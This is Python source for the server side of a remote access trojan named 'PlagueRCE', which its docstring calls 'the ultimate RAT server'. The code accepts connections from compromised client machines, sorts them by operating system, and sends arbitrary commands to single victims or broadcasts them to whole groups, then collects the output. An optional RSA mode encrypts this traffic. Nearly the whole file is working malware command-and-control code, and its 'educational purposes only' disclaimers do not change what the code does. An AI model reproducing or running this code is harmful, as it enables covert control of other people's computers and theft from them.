import socket
import threading
from typing import Tuple, Dict
import sys
from colorama import Fore
import logging
import time
from modules.server_modules.cryptography import cryptography_toolkit
from modules.server_modules.logo import logo
from modules.server_modules.help import help_message

# This code is so unreadable, this is why you use multiple classes and polymorphism ;(
# MY CODE IS FOR EDUCATIONAL PURPOSES AND ETHICAL USE ONLY
class PlagueRCE:
    ''' 
Welcome to PlagueRCE, the ultimate RAT server

Please use this code for educational purposes only, if one of you script kiddies
happen to end up in possession of my code, if you use this in a harmful, unethical or 
illegal manner, you will end up in prison and I will not be held responsible for your actions. 
Please note: this server is strictly to be used for pentesting only, therefore
it does not have any functions relating to denial of service attacks or anything else 
intended to cause harm.
    '''
    def __init__(self, bytesize: int=1024, RATE_LIMIT_TIME: float | int=0.5) -> None:
        ''' Class Initializer '''

        print(Fore.RED+logo+Fore.RESET) # Logo color red

        # Obtain host information
        self.host_ip: str = socket.gethostbyname(socket.gethostname()) # Obtain host ip address
        self.host_port: int = int(input("Enter server port to listen for connections on: "))

        print(Fore.CYAN+f'Host (your) ip:port - {self.host_ip}:{self.host_port}'+Fore.RESET)

        # Bytesize of messages being sent between the server and client
        self.bytesize: int = bytesize

        # Amount of time between each command input by user
        self.RATE_LIMIT_TIME: float | int = RATE_LIMIT_TIME
        
        # Variable storing the ip address of the current connected client
        self.connected_client: bool | str = None 

        # Initialize the server socket
        self.server: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.host_ip, self.host_port))
        self.server.listen()

        # Dictionary to hold list of clients and their ip addresses + port numbers + operating system
        self.client_list: Dict[str, list[Tuple[socket.socket,int,str]]] = {} # {client ip:[(client, client_port, client_OS), ]}

        # Dictionary to hold list of operating systems and connected clients with that OS
        self.OS_list: Dict[str, list[Tuple[socket.socket, str]]] = {} # {OS:[(client, client_ip), ]}

        # Dictionary to hold responses from clients
        self.responses_list: Dict[str, list[Tuple[str,list[str]]]] = {} # {operating_system:[(client_ip,[response1,response2...])] }

        # Variable to indicate if server is in encryption mode
        self.encryption_mode_flag: bool = False
        self.private_key = None # Variable storing the current server private key
        self.public_key = None # Variable storing the current server public key

        # Dictionary to hold clients key pairs for encrypted communication
        self.client_keys: Dict[socket.socket, Tuple[bytes,bytes]] = {} # {client:(private_key, public_key)}


    ''' Functions to handle server/client communication'''
    # Handle encrypting commands
    def encrypt_command(self, command: str, client: socket.socket) -> str:
        ''' 
        Function to encrypt commands with clients public key,
        if server was not in encryption mode when client connected, 
        then return command unencrypted
        '''
        if client in self.client_keys.keys():
            public_key: bytes = self.client_keys[client][1] # Get client's public key
            encrypted_command: str = cryptography_toolkit.encrypt_message(command, public_key)
            return encrypted_command
        
        else: # If client joined server while encryption mode was off
            return command

    # Handle decrypting responses
    def decrypt_response(self, response: str, client: socket.socket) -> str:
        ''' 
        Function to decrypt commands with clients private key,
        if server was not in encryption mode when client connected, 
        then return response undecrypted
        '''
        if client in self.client_keys.keys():
            private_key: bytes = self.client_keys[client][0] # Get client's private key
            decrypted_response: str = cryptography_toolkit.decrypt_message(response, private_key)
            return decrypted_response

        else: # If client joined server while encryption mode was off
            return response
        
    # Handle sending commands to client
    def send_command(self, command: str, client_ip: str, current_all: bool=False, all_clients: bool=False, all_clients_payloads: bool=False, all_OS: bool=False, all_OS_payloads: bool=False) -> False:
        ''' Function to send a command to the client '''

        try:
            if len(command) > 0: # Don't send if empty input
                
                # Flag to send command to all payloads on currently connected client
                if current_all:
                    for connection in self.client_list[client_ip]:
                        try:
                            client: socket.socket = connection[0] # Get client information
                            encrypted_command: str = self.encrypt_command(command, client)
                            client.send(encrypted_command.encode()) # Send command to client
                        except: # Catch errors in for loops and continue to ensure for loop doesn't break due to exception
                            continue
                
                # Flag to send command to first payload on all clients
                elif all_clients:
                    for connections in self.client_list.values():
                        try:
                            client: socket.socket = connections[0][0] # Get client information
                            encrypted_command: str = self.encrypt_command(command, client)
                            client.send(encrypted_command.encode()) # Send command to client
                        except: # Catch errors in for loops and continue to ensure for loop doesn't break due to exception
                            continue
                
                # Flag to send command to every payload on all clients
                elif all_clients_payloads:
                    for connections in self.client_list.values():
                        try:
                            for connection in connections:
                                try:
                                    client: socket.socket = connection[0] # Get client information
                                    encrypted_command: str = self.encrypt_command(command, client)
                                    client.send(encrypted_command.encode()) # Send command to client
                                except: # Catch errors in for loops and continue to ensure for loop doesn't break due to exception
                                    continue
                        except: # Catch errors in for loops and continue to ensure for loop doesn't break due to exception
                            continue

                # Flag to send command to first payload on all clients using a particular OS
                elif all_OS:
                    
                    # Display all OS 
                    print('All connected operating systems: ')
                    for operating_system in self.OS_list.keys():
                        print(operating_system)
                    
                    # Temporary CLI
                    chosen_OS: str = input(Fore.GREEN+'Input the OS you want to send the command to (case sensitive): ').strip()
                    print(Fore.LIGHTMAGENTA_EX)
                    if self.command_option(chosen_OS):
                        return False
                    
                    # Ensure chosen_OS is valid
                    if chosen_OS not in self.OS_list.keys():
                        print('OS not being used by any connected clients ')
                        return False
                    
                    # Send command to first payload on all clients using chosen_OS
                    for client_ip in self.client_list.keys():
                        try:
                            if self.client_list[client_ip][0][2] == chosen_OS:
                                client: socket.socket = self.client_list[client_ip][0][0]
                                encrypted_command: str = self.encrypt_command(command, client)
                                client.send(encrypted_command.encode()) # Send command to client
                        except: # Catch errors in for loops and continue to ensure for loop doesn't break due to exception
                            continue
                
                # Flag to send command on all payloads across all clients using a particular OS
                elif all_OS_payloads:
                    
                    # Display all OS 
                    print('All connected operating systems: ')
                    for operating_system in self.OS_list.keys():
                        print(operating_system)

                    # Temporary CLI
                    chosen_OS: str = input(Fore.GREEN+'Input the OS you want to send the command to (case sensitive): ').strip()
                    print(Fore.LIGHTMAGENTA_EX)
                    if self.command_option(chosen_OS):
                        return False
                    
                    # Ensure chosen_OS is valid
                    if chosen_OS not in self.OS_list.keys():
                        print('OS not being used by any connected clients ')
                        return False
                    
                    # Send command to first payload on all clients using chosen_OS
                    for connection in self.OS_list[chosen_OS]:
                        try:
                            client: socket.socket = connection[0]
                            encrypted_command: str = self.encrypt_command(command, client)
                            client.send(encrypted_command.encode()) # Send command to client
                        except: # Catch errors in for loops and continue to ensure for loop doesn't break due to exception
                            continue

                # By default, encrypt command and send to first payload on currently connected client
                else:
                    client: socket.socket = self.client_list[client_ip][0][0] # Get client socket
                    encrypted_command: str = self.encrypt_command(command, client)
                    client.send(encrypted_command.encode()) # Send command to client
                time.sleep(self.RATE_LIMIT_TIME) # Rate limiting to prevent user from spamming commands
        except: # Pretend the error doesn't exist and it will resolve itself
            pass

    # Function to handle receiving responses from clients
    def receive_response(self, client_ip: str, client: socket.socket) -> None: 
        ''' Function to handle receiving responses from clients '''

        try:
            while True:
                # Receive, decode, and decrypt the response
                client_response: str = client.recv(self.bytesize).decode()
                client_response: str = client_response.strip()
                if client_response == 'P1NGS3RV3R': # Send 'P1NGS3RV3R' from client to server to test connection
                    continue
                decrypted_client_response: str = self.decrypt_response(client_response, client)
                client_OS: str = self.client_list[client_ip][0][2]
                
                if client_ip not in self.client_list:
                    return None
                
                # Client side can't send empty responses, to prevent resource exhaustion vulnerability
                if len(decrypted_client_response) == 0:
                    self.disconnect(client_ip, client)
                    return None
        
                # Add response to the response list      
                if client_OS in self.responses_list.keys():
                    for i, response_data in enumerate(self.responses_list[client_OS]):
                        if response_data[0] == client_ip:
                            response_data[1].append(decrypted_client_response)
                            break
                        elif i == (len(self.responses_list)-1):
                            self.responses_list[client_OS].append((client_ip, [decrypted_client_response]))
                else:
                    self.responses_list[client_OS] = [(client_ip,[decrypted_client_response])]
        except: 
            self.disconnect(client_ip, client)
            return None


    ''' Functions to handle CLI '''
    # Function to check how user would like to send command to clients
    def send_option(self, command: str, client_ip: str) -> bool:
        ''' Function to handle checking send options '''

        try:
            if len(self.client_list.keys()) == 0:
                logging.critical("No client's are currently connected to server ;(")
                return False
            
            # Commands which are one character
            match command[0]:

                # / escapes send options
                case '/':
                    if client_ip not in self.client_list.keys(): # Ensure current connected client is set
                        logging.critical('Current connected client is not set')
                        return False
                    command: str = command[1:]
                    self.send_command(command, client_ip) # Send command to first payload for currently connected client as default
                    return True

                # $command sends to all payloads for currently connected client
                case '$':
                    if client_ip not in self.client_list.keys(): # Ensure current connected client is set
                        logging.critical('Current connected client is not set')
                        return False
                    command: str = command[1:]
                    self.send_command(command, client_ip, current_all=True)
                    return True
        
                # !command sends to first payload for all clients
                case '!':
                    command: str = command[1:]
                    self.send_command(command, client_ip, all_clients=True)
                    return True
                
                case '?': # A genius admires simplicity while an idiot admires complexity
                    command: str = command[1:]
                    self.send_command(command, client_ip, all_clients_payloads=True)
                    return True
                
                # *command sends to first payload on all clients using a given OS
                case '*': 
                    command: str = command[1:]
                    self.send_command(command, client_ip, all_OS=True)
                    return True
                
                # &command sends to all payloads on all clients using a given OS
                case '&': 
                    command: str = command[1:]
                    self.send_command(command, client_ip, all_OS_payloads=True)
                    return True
        
                # Send command to first payload for currently connected client as default
                case _:
                    if client_ip not in self.client_list.keys(): # Ensure current connected client is set
                        logging.critical('Current connected client is not set')
                        return False
                    self.send_command(command, client_ip)
                    return True
        except:
            return False

    # Function to check if user has input a CLI/server command
    def command_option(self, command: str) -> bool:
        ''' 
        Function to check and execute commands which interact with CLI

        Handles all CLI commands
        '''
        

        ''' User help based CLI commands '''
        def help() -> None:
            ''' Function to allow user to list all available CLI options '''
            
            print(f'\n{help_message}\n') # Display CLI help message for user

        # Function for command to check if user has typed 'quit' command
        def check_quit(message: str) -> False:
            '''Function for command to check if user would like to exit server'''

            # Instructions for server to exit
            if message == "quit":
                print(Fore.LIGHTGREEN_EX+'Happy Hacking ;)'+Fore.RESET) # Reset terminal state 
                self.server.close()
                sys.exit()
            else:
                return False
        

        ''' Encryption mode based CLI commands '''
        # Function for command to display current key pair 
        def current_keys() -> None:
            '''Function to display current key pair'''

            if self.encryption_mode_flag:
                # Display current server keys
                print(f'\nCurrent RSA private key:\n{self.private_key}\nCurrent RSA public key:\n{self.public_key}')
            else:
                print('Currently not in encryption mode')
        
        # Function for command to generate new key pair and switch on encryption mode
        def encryption_mode() -> bool:
            ''' 
            Function for command to switch on encryption mode 
            and allow user to either generate new key pair or use their own
            4096 bit RSA key pair
            '''

            if self.encryption_mode_flag == False:

                # User can use their own 4096 bit RSA key pair
                if input(Fore.GREEN+'Enter y if you would like to use your own RSA 4096 bit key pair (case sensitive): ').strip()  == 'y':
                    self.private_key = input('Enter your RSA 4096 bit private key:\n').strip() 
                    self.public_key = input('Enter your RSA 4096 bit public key:\n').strip() 
                    self.encryption_mode_flag = True
                    print(Fore.LIGHTMAGENTA_EX+f'\nYour RSA private key:\n{self.private_key}\nYour RSA public key:\n{self.public_key}\nYou are now in encryption mode')
                    return True
                print(Fore.LIGHTMAGENTA_EX)
                      
                # Generate and display new server key pair
                self.private_key, self.public_key = cryptography_toolkit.generate_key_pair()
                self.encryption_mode_flag = True
                print(f'\nYour RSA private key:\n{self.private_key}\nYour RSA public key:\n{self.public_key}\nYou are now in encryption mode')
            else:
                print('Already in encryption mode')
                return False
        
        # Function for command to generate new server key pair in encryption mode
        def new_keys() -> bool:
            ''' 
            Function for command to generate new server key pair in encryption mode or to 
            change server key pair to user's specified 4096 bit RSA key pair
            '''

            if self.encryption_mode_flag == True:

                # User can use their own 4096 bit RSA key pair
                if input(Fore.GREEN+'Enter y if you would like to use your own RSA 4096 bit key pair (case sensitive): ').strip()  == 'y':
                    self.private_key = input('Enter your RSA 4096 bit private key:\n').strip() 
                    self.public_key = input('Enter your RSA 4096 bit public key:\n').strip() 
                    self.encryption_mode_flag = True
                    print(Fore.LIGHTMAGENTA_EX+f'\nYour RSA private key:\n{self.private_key}\nYour RSA public key:\n{self.public_key}\n')
                    return True
                print(Fore.LIGHTMAGENTA_EX)
                
                # Generate and display new server key pair
                self.private_key, self.public_key = cryptography_toolkit.generate_key_pair()
                print(f'\nYour new RSA private key:\n{self.private_key}\nYour new RSA public key:\n{self.public_key}\n')
            else:
                print('You are not in encryption mode')
                return False
        
        # Function for command to delete server key pair and switch off encryption mode
        def unencryption_mode() -> None:
            ''' Function for command to switch off encryption mode '''
            
            if self.encryption_mode_flag:
                # Turn off encryption mode and delete server key pair
                self.encryption_mode_flag = False
                self.private_key = None
                self.public_key = None 
                print('Server key pair deleted, encryption mode disabled')
            else:
                print('Encryption mode already switched off')


        ''' Current connected client based CLI commands '''
        # Function for command to show the current client user is connected to
        def current_client() -> None:
            ''' 
            Function for command to handle showing the current connected client 
            the user is connected to and their information
            '''
            # Check if current connected client is valid
            if self.connected_client is None or self.connected_client not in self.client_list.keys():
                print('User is currently not connected to a client')
                return None
            
            client_OS: str = self.client_list[self.connected_client][0][2]
            all_ports: list[int] = [] # List to store ports for all current connected clients active connections 
            for connection in self.client_list[self.connected_client]:
                all_ports.append(connection[1])
            print(f'Current connected client ip address: {self.connected_client} client OS: {client_OS}\nConnected ports:', *[str(port) +',' for port in all_ports])
        
        # Function for command to display current connected client's operating system
        def current_client_OS() -> None:
            ''' Function to display current connected client's operating system '''
            
            # Check if current connected client is valid
            if self.connected_client is None or self.connected_client not in self.client_list.keys():
                print('User is currently not connected to a client')
                return None
            
            client_OS: str = self.client_list[self.connected_client][0][2]
            print(f'Current connected client\'s operating system: {client_OS}')

        # Function for command to display responses from currently connected client
        def current_client_responses(all: bool=False) -> False:
            ''' Function for command to display responses from currently connected client '''
            
            client_ip: str = self.connected_client

            # Ensure current connected client is valid
            if client_ip not in self.client_list:
                print('Current connected client is not set')
                return False
            
            client_OS: str = self.client_list[self.connected_client][0][2]
            # Ensure client ip  has sent a response to the server
            responded: bool = False # Flag indicating if client ip has sent a response to the server
            for i, response_data in enumerate(self.responses_list[client_OS]):
                if response_data[0] == client_ip:
                    client_response_index: int = i
                    responded: bool = True
                    break
            if responded == False:        
                print(f'client ip: {client_ip} has not sent a response to server')
                return False
            
            responses: list[str] = self.responses_list[client_OS][client_response_index][1]

            if all == True: # Flag to display all responses from current client
                print(f'Current client ip: {client_ip}, client\'s operating system: {client_OS}')
                
                for response_number, response in enumerate(responses): # Get each response along with their index
                    print(f'Response {response_number+1}\n{response}\n')
                    
            else: # By default, print only the last response of current client
                print(f'Current client ip: {client_ip}, client\'s operating system: {client_OS}')
                    
                response_number: int = len(responses)
                print(f'Current client most recent response (response {response_number}):\n{responses[-1]}\n')

        # Function for command to change connected client 
        def change_client() -> None:
            ''' Function for command to connect to a client '''

            client_ip: str = input(Fore.GREEN+"Enter client ip address to connect to: ").strip()
            print(Fore.LIGHTMAGENTA_EX)
            if client_ip in self.client_list.keys(): # Check if client ip is connected to server
                self.connected_client = client_ip # Change currently connected client
            elif self.command_option(client_ip) == False:
                print('ERROR: client ip is not connected to server')
        

        ''' All connected clients based CLI commands'''
        # Function for command to list all clients and their information
        def list_clients() -> None:
            ''' Function for command to display all connected clients '''

            if len(self.client_list.keys()) > 0: # Ensure at least one client is connected 
                # Sort clients based on their operating system
                for operating_system in self.OS_list.keys():
                    print(f'\n{operating_system}:')

                    # Prepare all client ip addresses using the operating system
                    client_ip_list: list[str] = [] # List of all unique client ip addresses using OS
                    for connection in self.OS_list[operating_system]:
                        client_ip: str = connection[1]
                        all_ports: list[int] = [] # List of all clients ports
                            
                        # Store clients ports in all_ports
                        for connection in self.client_list[client_ip]:
                            all_ports.append(connection[1])
                        
                        # Display client information
                        if client_ip not in client_ip_list: 
                            client_ip_list.append(client_ip)
                            print(f'Client ip: {client_ip}, Connected ports:', *[str(port) + ',' for port in all_ports])
            else:
                print('No clients are currently connected ;(')
        
        # Function for command to display all operating systems being used by clients
        def list_OS() -> None:
            ''' Function for command to list all operating systems being used by clients '''
            
            # Ensure at least one OS is available
            if len(self.client_list.keys()) == 0:
                print('No clients are currently connected to server ;(')
                return None
            # Display all operating systems being used by clients
            print('\nAll operating systems being used by clients: ')
            for operating_system in self.OS_list.keys():
                print(operating_system)
        
        # Function for command to list all clients who have sent a response to server
        def who_responded() -> None:
            ''' Function for command to list all clients who have sent a response to server'''

            if len(self.responses_list.keys()) > 0: # Ensure at least one response has been received

                # Iterate through all operating systems being used by clients who responded
                for operating_system in self.responses_list.keys():
                    print(f'\nOS: {operating_system}')
                    
                    # Print all clients who have sent a response
                    for response_data in self.responses_list[operating_system]:
                        print(response_data[0])
            else:
                print('No responses have been received ;(')
        
        # Function for command to list stored responses from clients
        def list_responses(amount_on: bool=False, latest: bool=False, all_responses: bool=False, all_OS: bool=False) -> bool:
            ''' Function for command to list all responses from given clients '''
            
            try:
                # If server has not received any responses
                if len(self.responses_list.keys()) == 0: 
                    print('No responses received')
                    return False
                    
                # Get ip for chosen client if necessary
                if amount_on or latest:
                    client_ip: str = input(Fore.GREEN+"Enter client ip address to list response(s) from: ").strip()
                    print(Fore.LIGHTMAGENTA_EX)

                    if self.command_option(client_ip): # Check if user input is a CLI command
                        return False
                    
                    client_response_index: int = 0 # Variable to store index of clients response data
                    client_OS: str = 'Not set' # Variable to store clients OS
                
                    # Ensure client ip  has sent a response to the server
                    responded: bool = False # Flag indicating if client ip has sent a response to the server
                    for operating_system in self.responses_list.keys():
                        for i, response_data in enumerate(self.responses_list[operating_system]):
                            if response_data[0] == client_ip:
                                client_response_index: int = i
                                client_OS: str = operating_system
                                responded: bool = True
                                break
                    if responded == False:        
                        print(f'client ip: {client_ip} has not sent a response to server')
                        return False
                    responses: list[str] = self.responses_list[client_OS][client_response_index][1] # List storing all clients responses
                
                    # Flag to list all responses up to a given amount 
                    if amount_on:
                        amount_available: int = len(responses) # Total amount of responses from client
                        print(f'Amount of responses from client {client_ip}: {amount_available}')
                        amount: str = input(Fore.GREEN+'Input response number to be shown up to: ') # User inputs response number to be given up to
                        print(Fore.LIGHTMAGENTA_EX)

                        if self.command_option(amount): # Check if user input is a CLI command
                            return False
                    
                        try:
                            amount: int = int(amount)
                            if amount < 0: # Prevent bugs from slicing with negative amount
                                return False
                        except:
                            print("ERROR: Invalid user input for amount")

                        for response_number, response in enumerate(responses[:amount]): # Get each response along with their index
                            print(f'Response {response_number+1}:\n{response}\n')

                    # Flag to list only the most recent response from chosen client
                    elif latest:
                        response_number: int = len(responses) # Number to indicate how recent the response is for client
                        response: str = responses[-1]
                        print(f'Latest response (response {response_number}):\n{response}\n')
            
                # Flag to list all responses from all clients
                elif all_responses:
                
                    # Iterate over all responses and print them
                    for operating_system in self.responses_list.keys():
                        print(f'\nOS: {operating_system}')
                        for response_data in self.responses_list[operating_system]:
                            client_ip: str = response_data[0]    
                            print(f'\nclient ip: {client_ip}')
                            for response_number, response in enumerate(response_data[1]): # Get each response along with their index
                                print(f'Response {response_number+1}:\n{response}\n')
            
                # Flag to list all responses for a particular operating system
                elif all_OS:
                    
                    # Display all valid operating systems for user to choose from
                    print('All operating systems used by clients who have sent a response: ')
                    for operating_system in self.responses_list.keys():
                        print(operating_system)
                    
                    # Temporary CLI
                    operating_system: str = input(Fore.GREEN+'Enter operating system you would like to display response(s) from (case sensitive): ').strip()
                    print(Fore.LIGHTMAGENTA_EX)
                    if self.command_option(operating_system):
                        return False
                    
                    # Check operating system is being used by clients
                    if operating_system not in self.responses_list.keys():
                        print(f'No clients using operating system: {operating_system} have sent a response')
                        return False
                    
                    # Iterate through all responses from clients using the operating system and print them
                    for response_data in self.responses_list[operating_system]:
                        client_ip: str = response_data[0]    
                        print(f'\nclient ip: {client_ip}')
                        for response_number, response in enumerate(response_data[1]): # Get each response along with their index
                            print(f'Response {response_number+1}:\n{response}\n')
            except: # Pretend the error doesn't exist and it will resolve itself
                pass
                

        command: str = str(command).strip()
        
        # Keeping my code clean while handling index out of range error
        if len(command) == 0:
            return False
        
        # / escapes CLI commands
        if command[0] == '/':
            return False

        # Switch statement to check and execute command
        match command:
            # User help based CLI commands
            case "help":
                help()
                return True
            case "quit":
                check_quit(command)
                return True
            
            # Encryption mode based CLI commands
            case "current_keys":
                current_keys()
                return True
            case "encryption_mode":
                encryption_mode()
                return True
            case "new_keys":
                new_keys()
                return True
            case "unencryption_mode":
                unencryption_mode()
                return True
            
            # Current connected client based CLI commands
            case "current":
                current_client()
                return True
            case "current_client_OS":
                current_client_OS()
                return True
            case "current_latest":
                current_client_responses()
                return True
            case "current_all":
                current_client_responses(all=True)
                return True
            case "change":
                change_client()
                return True
            
            # All connected clients based CLI commands
            case "list":
                list_clients()
                return True
            case "list_OS":
                list_OS()
                return True
            case "who_responded":
                who_responded()
                return True
            case "responses_amount":
                list_responses(amount_on=True)
                return True
            case "responses_latest":
                list_responses(latest=True)
                return True
            case "responses_all":
                list_responses(all_responses=True)
                return True
            case "responses_all_OS":
                list_responses(all_OS=True)
                return True
            
            # If not a CLI command return False
            case _:
                return False

    # Control center for server communication to clients
    def CLI(self) -> None:
        ''' 
        Server control center
        
        Handles communication with clients
        Choose a client you would like to access, and send commands to be executed by them
        '''
        try:
            if input(Fore.GREEN+"Would you like to startup in encryption mode? Enter 'y' for yes (case sensitive)\n(ENCRYPTION MODE IS NOT RECOMMENDED): ").strip() == "y":
                print(Fore.LIGHTMAGENTA_EX)
                self.command_option('encryption_mode')
            print(Fore.LIGHTMAGENTA_EX+"\nEnter 'help' to show all available CLI commands ") 

            while True:
                # Ensure currently connected client is still connected to server
                if self.connected_client not in self.client_list.keys() and self.connected_client != None:
                    print(f'Currently connected client: {self.connected_client} has disconnected from the server')
                    self.connected_client = None
                
                # Take user input and carry out the given CLI command or send commands to client
                command: str = input(Fore.LIGHTGREEN_EX+"$ ").strip() # Nice looking shell
                print(Fore.LIGHTMAGENTA_EX) # All text on the CLI is light magenta
                if self.command_option(command) == False: # If input was not CLI/server command, send command to client
                    self.send_option(command, self.connected_client) # Check send option and send command to currently connected client
        except KeyboardInterrupt:
            pass

    ''' Functions to handle client connections to server '''
    # Handle client disconnection 
    def disconnect(self, client_ip: str, client: socket.socket) -> None:
        ''' Handle client disconnections by removing them from client list '''
        
        try:
            # Remove client from OS list
            for connection in self.client_list[client_ip]:
                if connection[0] == client:
                    client_OS: str = connection[2]
                    client_OS_info: Tuple[socket.socket, str] = (client, client_ip)
                    self.OS_list[client_OS] = [OS_info for OS_info in self.OS_list[client_OS] if OS_info != client_OS_info]

                    # If OS has no clients using it left
                    if len(self.OS_list[client_OS]) == 0:
                        self.OS_list.pop(client_OS) 
                    break
            
            # Remove active connection from client list
            self.client_list[client_ip] = [connection for connection in self.client_list[client_ip] if connection[0] != client] # Really slow but any other way doesn't work lol

            # Delete client's key pair
            if client in self.client_keys.keys():
                self.client_keys.pop(client) 

            # Remove client from client list if client has no active connections
            if len(self.client_list[client_ip]) == 0:
                self.client_list.pop(client_ip) 
        
            # Close the socket connection with the client
            client.close()
        except: # Pretend the error doesn't exist and it will resolve itself
            pass
    
    # Handle operating system detection
    def OS_detection(self, client: socket.socket, client_ip: str) -> str:
        ''' Function to handle OS detection on clients '''

        try:
            while True:
                # OS should be sent decrypted for simplicity
                client_OS: str = client.recv(self.bytesize).decode()
                client_OS: str = client_OS.strip()

                if len(client_OS) == 0:
                    client_OS: str = 'Unknown'

                # In case of race condition
                client_OS: str = client_OS.removeprefix('P1NGS3RV3R')
                client_OS: str = client_OS.removesuffix('P1NGS3RV3R')
                
                # Store the clients OS
                if client_OS not in self.OS_list:
                    self.OS_list[client_OS] = [(client, client_ip)]
                else:
                    self.OS_list[client_OS].append((client, client_ip))
                return client_OS
        except: # Pretend the error doesn't exist and it will resolve itself
            pass


    # Handle client connection
    def connect(self) -> None:
        ''' Function to handle connecting to the server '''

        try:
            while True: 
                # Accept a connection request
                client, address = self.server.accept()
                client_ip: str = address[0]
                client_port: int = address[1]

                # Store clients keypair if in encryption mode
                if self.encryption_mode_flag:
                    self.client_keys[client] = (self.private_key, self.public_key) 
                
                # Detect clients OS
                client_OS: str = self.OS_detection(client, client_ip)
                
                # Store client information and start thread to listen for responses from client
                if client_ip in self.client_list.keys(): # If client is already connected
                    self.client_list[client_ip].append((client,client_port, client_OS))
                else:
                    self.client_list[client_ip] = [(client, client_port, client_OS)]
                
                # Startthread to listen for responses from client
                client_thread = threading.Thread(target=self.receive_response, args=(client_ip,client), daemon=True)
                client_thread.start()
        except: # Pretend the error doesn't exist and it will resolve itself
            pass

     # Start the server
    def start_server(self) -> None:
        ''' Function to start the server '''

        try:
            # Create and start new thread to connect new client to server
            connect_thread = threading.Thread(target=self.connect, daemon=True)
            connect_thread.start()

            # Start the CLI
            self.CLI()
        finally:
            # Close the server socket
            self.server.close()
